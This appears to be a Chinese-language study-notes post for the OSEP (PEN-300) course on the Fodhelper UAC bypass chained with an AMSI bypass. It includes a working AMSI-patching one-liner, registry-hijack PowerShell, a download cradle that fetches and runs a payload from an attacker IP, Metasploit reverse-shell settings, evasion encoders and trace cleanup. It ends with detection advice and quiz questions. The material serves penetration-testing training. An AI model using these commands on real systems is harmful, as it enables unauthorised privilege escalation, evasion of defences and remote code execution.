---
title: OSEP-08-UAC绕过与AMSI综合案例
description: '08-AMSI绕过 | 09-UAC绕过与AMSI综合案例'
pubDate: 2026-01-30T00:01:22+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
  - Red Team
---

# UAC 绕过与 AMSI 综合案例

## 写在前面

本章通过 Fodhelper UAC 绕过案例，展示如何结合 AMSI 绕过技术实现完整的提权攻击链。这是一个真实的攻防场景。

---

## 一、Fodhelper UAC 绕过原理

### 1.1 什么是 UAC？

**UAC (User Account Control)** 是 Windows 的安全机制：
- 防止未经授权的程序修改系统
- 即使管理员也默认以标准用户权限运行
- 需要提权时弹出 UAC 提示

### 1.2 完整性级别 (Integrity Level)

| 级别 | 标识 | 说明 |
|------|------|------|
| Low | S-1-16-4096 | IE 保护模式 |
| Medium | S-1-16-8192 | 标准用户 |
| High | S-1-16-12288 | 管理员提权后 |
| System | S-1-16-16384 | 系统进程 |

```powershell
# 查看当前进程完整性级别
whoami /groups | findstr "Mandatory Label"

# Medium 级别输出
Mandatory Label\Medium Mandatory Level

# High 级别输出
Mandatory Label\High Mandatory Level
```

### 1.3 Fodhelper.exe 简介

**Fodhelper.exe** 是 Windows 10 内置程序：
- 用于管理可选功能（如键盘设置）
- 自动以 **High Integrity** 运行
- 不弹出 UAC 提示
- 从当前用户注册表读取配置

---

## 二、漏洞分析

### 2.1 注册表查询路径

Fodhelper.exe 尝试读取：

```
HKCU:\Software\Classes\ms-settings\shell\open\command
```

**关键点：**
- 默认不存在
- HKCU 可以被当前用户修改
- Fodhelper 以 High Integrity 运行
- 可以利用这个机制启动高权限进程

### 2.2 利用流程图

```
用户创建恶意注册表键
         ↓
设置 (Default) = "powershell.exe ..."
         ↓
设置 DelegateExecute = ""
         ↓
执行 fodhelper.exe
         ↓
Fodhelper 读取注册表
         ↓
以 High Integrity 启动 PowerShell
         ↓
成功绕过 UAC！
```

---

## 三、基础 PoC

### 3.1 手动测试

```powershell
# 第一步：创建注册表键并设置默认值
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command `
    -Value powershell.exe `
    -Force

# 第二步：创建 DelegateExecute 值
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command `
    -Name DelegateExecute `
    -PropertyType String `
    -Force

# 第三步：触发 Fodhelper
C:\Windows\System32\fodhelper.exe
```

### 3.2 验证提权

打开的 PowerShell 窗口中执行：

```powershell
# 查看完整性级别
whoami /groups

# 应该看到：
Mandatory Label\High Mandatory Level  Label  S-1-16-12288
```

---

## 四、Metasploit 模块测试

### 4.1 使用 Metasploit

```bash
# 1. 切换到 UAC 绕过模块
use exploit/windows/local/bypassuac_fodhelper

# 2. 设置目标架构
set target 1  # Windows x64

# 3. 设置已有会话
set session 1

# 4. 配置 payload
set payload windows/x64/meterpreter/reverse_https
set lhost 192.168.119.120
set lport 444

# 5. 执行
exploit
```

### 4.2 AMSI 检测问题

执行后发现：
```
[*] Configuring payload and stager registry keys ...
[-] Exploit failed: Rex::TimeoutError Operation timed out.
```

**原因：**
- Metasploit 默认模块被 AMSI 检测
- Windows Defender 阻止了 PowerShell 执行
- 现有 Meterpreter 会话也被终止

---

## 五、改进方案：结合 AMSI 绕过

### 5.1 完整攻击链

```
1. 在 Kali 准备 shellcode runner (run.txt)
   └─ 包含 AMSI 绕过代码

2. 启动 Apache 服务器
   └─ 托管 run.txt

3. 在目标机器创建注册表键
   └─ 使用 PowerShell download cradle

4. 触发 Fodhelper
   └─ 下载并执行带 AMSI 绕过的 shellcode

5. 获得 High Integrity Meterpreter Shell
```

### 5.2 实现代码

**步骤 1：准备 run.txt（Kali）**

```powershell
# AMSI 绕过（选择一种方法）
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# Shellcode runner（这里用占位符）
# [实际的 shellcode runner 代码]
```

**步骤 2：修改注册表键**

```powershell
# 使用 download cradle
$payload = 'powershell.exe (New-Object System.Net.WebClient).DownloadString(''http://192.168.119.120/run.txt'') | IEX'

New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command `
    -Value $payload `
    -Force

New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command `
    -Name DelegateExecute `
    -PropertyType String `
    -Force

# 触发
C:\Windows\System32\fodhelper.exe
```

### 5.3 处理 Stage Encoding

如果 Meterpreter 第二阶段被检测：

```bash
# 启用 Stage Encoding
set EnableStageEncoding true
set StageEncoder x64/zutto_dekiru

# 或使用备选编码器
set StageEncoder x64/xor_dynamic

# 重新执行
exploit
```

---

## 六、成功验证

### 6.1 Metasploit 输出

```
msf5 exploit(multi/handler) > exploit

[*] Started HTTPS reverse handler on https://192.168.119.120:443
[*] https://192.168.119.120:443 handling request from 192.168.120.11
[*] Encoded stage with x64/zutto_dekiru
[*] Staging x64 payload (207506 bytes) ...
[*] Meterpreter session 3 opened
```

### 6.2 验证权限

```bash
meterpreter > shell
C:\Windows\system32> whoami /groups

GROUP INFORMATION
-----------------
...
Mandatory Label\High Mandatory Level  Label  S-1-16-12288
```

**成功！** 获得了 High Integrity 级别的 shell。

---

## 七、防御建议

### 7.1 检测点

| 检测方法 | 特征 |
|----------|------|
| 注册表监控 | `HKCU\Software\Classes\ms-settings\shell\open\command` 创建 |
| 进程监控 | Fodhelper.exe 启动异常进程 |
| 网络监控 | PowerShell download cradle 网络连接 |
| AMSI 日志 | 绕过尝试记录 |

### 7.2 缓解措施

```powershell
# 1. 监控注册表修改
# 使用 Sysmon 配置：
<RuleGroup name="" groupRelation="or">
  <RegistryEvent onmatch="include">
    <TargetObject condition="contains">
      \Software\Classes\ms-settings\shell\open\command
    </TargetObject>
  </RegistryEvent>
</RuleGroup>

# 2. 限制 PowerShell 执行
Set-ExecutionPolicy AllSigned -Scope LocalMachine

# 3. 应用 AppLocker 规则
# 阻止非管理员修改 ms-settings 处理程序
```

---

## 八、进阶改进

### 8.1 隐藏 PowerShell 窗口

```powershell
$payload = 'powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadString(''http://192.168.119.120/run.txt'') | IEX'
```

### 8.2 清理注册表痕迹

```powershell
# 执行后自动清理
Remove-Item -Path HKCU:\Software\Classes\ms-settings -Recurse -Force
```

### 8.3 使用 C# 替代 PowerShell

```csharp
// 避免 PowerShell 相关检测
// 使用 C# assembly 直接注入 shellcode
```

---

## 九、练习题

### 选择题

1. Fodhelper.exe 默认以什么完整性级别运行？
   - A) Medium
   - B) High
   - C) System
   - D) Low

2. 为什么 Fodhelper UAC 绕过有效？
   - A) 利用了 0day 漏洞
   - B) 读取用户可控的注册表键
   - C) 缓冲区溢出
   - D) DLL 劫持

3. DelegateExecute 注册表值的作用是什么？
   - A) 指定要执行的程序
   - B) 触发 COM 接口查找
   - C) 禁用 UAC
   - D) 设置权限

4. Metasploit 默认模块失败的主要原因是？
   - A) 网络问题
   - B) AMSI 检测
   - C) 防火墙阻止
   - D) 权限不足

5. EnableStageEncoding 的作用是？
   - A) 加密 C2 通信
   - B) 编码第二阶段 payload
   - C) 混淆注册表键
   - D) 绕过 AMSI

### 实操题

1. 手动执行 Fodhelper UAC 绕过并验证完整性级别
2. 结合 AMSI 绕过创建完整的提权攻击链
3. 使用 Sysmon 监控 Fodhelper 利用行为
4. 修改脚本添加自动清理功能

### 答案

选择题：1-B, 2-B, 3-B, 4-B, 5-B

---

## 十、总结

### 10.1 关键要点

✅ UAC 绕过利用合法的高权限程序
✅ 必须结合 AMSI 绕过才能实战成功
✅ Stage encoding 可绕过网络层检测
✅ 攻击链的每个环节都需要规避

### 10.2 完整攻击流程

```
初始访问（Medium Integrity）
         ↓
应用 AMSI 绕过
         ↓
执行 Fodhelper UAC 绕过
         ↓
获得 High Integrity Shell
         ↓
继续横向移动或权限维持
```

---

## 下一步

继续学习 [10-章节测试.md](/blog/osep/08-amsi绕过/10-章节测试/) 进行综合测试，或进入 [09-应用白名单绕过](/blog/osep/09-应用白名单绕过/00-章节指南/) 学习更多绕过方法。
